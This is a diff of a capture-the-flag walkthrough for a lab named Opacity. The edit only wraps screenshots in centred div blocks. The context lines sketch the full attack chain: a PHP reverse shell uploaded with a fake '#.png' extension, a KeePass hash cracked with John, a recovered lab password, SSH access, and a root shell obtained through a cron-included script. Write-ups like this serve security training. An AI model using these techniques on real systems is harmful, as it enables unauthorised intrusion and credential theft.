@@ -121,9 +121,9 @@ Task Completed
 ```
 
 This second pass revealed additional endpoints, including `/cloud/index.php` and a nested login path. Navigating to the cloud endpoint in the browser brought up a new interface.
-
-<img width="747" height="483" alt="image" src="https://github.com/user-attachments/assets/f849877b-d9e7-4c1e-b256-a4adacc6ec78" />
-
+<div align="center">
+  <img width="747" height="483" alt="image" src="https://github.com/user-attachments/assets/f849877b-d9e7-4c1e-b256-a4adacc6ec78" />
+</div>
 The page introduced itself as a personal cloud storage service with a time-limited file upload feature, which clearly marked it as a component worth paying close attention to moving forward.
 
 ## Exploitation
@@ -142,9 +142,9 @@ I edited the reverse shell and updated the IP address and port to match my VPN l
 ```
 nano php-reverse-shell.php
 ```
-
-<img width="451" height="242" alt="image" src="https://github.com/user-attachments/assets/3089ffd2-7410-4fcc-9063-ded6b2fef704" />
-
+<div align="center">
+  <img width="451" height="242" alt="image" src="https://github.com/user-attachments/assets/3089ffd2-7410-4fcc-9063-ded6b2fef704" />
+</div>
 For convenience, I made a shorter copy of the file.
 
 ```
@@ -172,12 +172,14 @@ With everything ready, I uploaded the payload by appending a fake image extensio
 ```
 http://<your-ip>:8000/shell.php#.png
 ```
-
-<img width="761" height="463" alt="image of upload" src="https://github.com/user-attachments/assets/b538a71c-471c-4346-89d0-2f5a546ca63b" />
-
+<div align="center">
+  <img width="761" height="463" alt="image of upload" src="https://github.com/user-attachments/assets/b538a71c-471c-4346-89d0-2f5a546ca63b" />
+</div>
 The upload went through successfully.
 
-<img width="778" height="338" alt="image link " src="https://github.com/user-attachments/assets/79bcf5ac-f11f-407e-87fa-fd5c6bb837af" />
+<div align="center">
+  <img width="778" height="338" alt="image link " src="https://github.com/user-attachments/assets/79bcf5ac-f11f-407e-87fa-fd5c6bb837af" />
+</div>
 
 The application returned a link to the uploaded file, which I invoked directly.
 
@@ -187,7 +189,9 @@ curl http://10.49.167.120/cloud/images/shell.php#.png
 
 That immediately triggered a reverse connection.
 
-<img width="684" height="209" alt="shell" src="https://github.com/user-attachments/assets/da76eabf-0443-4441-b2ca-2f37892f1c85" />
+<div align="center">
+  <img width="684" height="209" alt="shell" src="https://github.com/user-attachments/assets/da76eabf-0443-4441-b2ca-2f37892f1c85" />
+</div>
 
 At this point, I had an active shell as the `www-data` user.
 
@@ -253,7 +257,9 @@ bash linpeas.sh
 /opt/dataset.kdbx
 ```
 
-<img width="696" height="88" alt="image" src="https://github.com/user-attachments/assets/a06125bf-d4bf-44b4-90b3-98bddae61a19" />
+<div align="center">
+  <img width="696" height="88" alt="image" src="https://github.com/user-attachments/assets/a06125bf-d4bf-44b4-90b3-98bddae61a19" />
+</div>
 
 That file was the clear pivot point.
 
@@ -296,7 +302,9 @@ cd ~/john/run
 ./john hash.txt
 ```
 
-<img width="962" height="484" alt="img of cracking pass" src="https://github.com/user-attachments/assets/ecc13194-b5ce-4cc0-87e9-d2f09300e31f" />
+<div align="center">
+  <img width="962" height="484" alt="img of cracking pass" src="https://github.com/user-attachments/assets/ecc13194-b5ce-4cc0-87e9-d2f09300e31f" />
+</div>
 
 • Installed KeePassXC and opened the database using the recovered password
 
@@ -305,7 +313,9 @@ keepassxc dataset.kdbx
 # pass: 741852963
 ```
 
-<img width="804" height="630" alt="image of db" src="https://github.com/user-attachments/assets/71167515-dc71-47e3-b36b-b086516245f5" />
+<div align="center">
+  <img width="804" height="630" alt="image of db" src="https://github.com/user-attachments/assets/71167515-dc71-47e3-b36b-b086516245f5" />
+</div>
 
 The database contained credentials that immediately changed the game.
 
@@ -324,7 +334,9 @@ ssh sysadmin@ip
 • Accessed the home directory
 • Read the `local.txt` flag
 
-<img width="439" height="67" alt="image" src="https://github.com/user-attachments/assets/60ba1c10-1032-45db-9ab9-7ca71d03f874" />
+<div align="center">
+  <img width="439" height="67" alt="image" src="https://github.com/user-attachments/assets/60ba1c10-1032-45db-9ab9-7ca71d03f874" />
+</div>
 
 ```
 6661b61b44d234d230d06bf5b3c075e2
@@ -341,7 +353,9 @@ With user access secured, I moved on to reviewing scheduled or automated scripts
 ```
 cat script.php
 ```
-<img width="847" height="393" alt="image" src="https://github.com/user-attachments/assets/19477838-96ff-4473-82c8-d5f02f0d7fbf" />
+<div align="center">
+  <img width="847" height="393" alt="image" src="https://github.com/user-attachments/assets/19477838-96ff-4473-82c8-d5f02f0d7fbf" />
+</div>
 
 Although the main script wasn’t writable, the included file immediately stood out.
 
@@ -396,7 +410,9 @@ After a short wait, the scheduled task executed the modified script.
 • Incoming connection received
 • Shell spawned with root privileges
 
-<img width="527" height="225" alt="image" src="https://github.com/user-attachments/assets/4dff12f6-6bdd-4d73-834f-fd70ba801b33" />
+<div align="center">
+  <img width="527" height="225" alt="image" src="https://github.com/user-attachments/assets/4dff12f6-6bdd-4d73-834f-fd70ba801b33" />
+</div>
 
 With root access confirmed, retrieving the final flag was straightforward.
 
@@ -412,4 +428,6 @@ Opacity was a solid lab that rewarded careful enumeration and patience rather th
 **Thanks for reading.**
 You can also find my walkthroughs on Medium: [https://medium.com/@deathesther](https://medium.com/@deathesther)
 
-<img width="1076" height="606" alt="image" src="https://github.com/user-attachments/assets/de616619-961f-4b53-be31-aae4d86c7a1c" />
+<div align="center">
+  <img width="1076" height="606" alt="image" src="https://github.com/user-attachments/assets/de616619-961f-4b53-be31-aae4d86c7a1c" />
+</div>
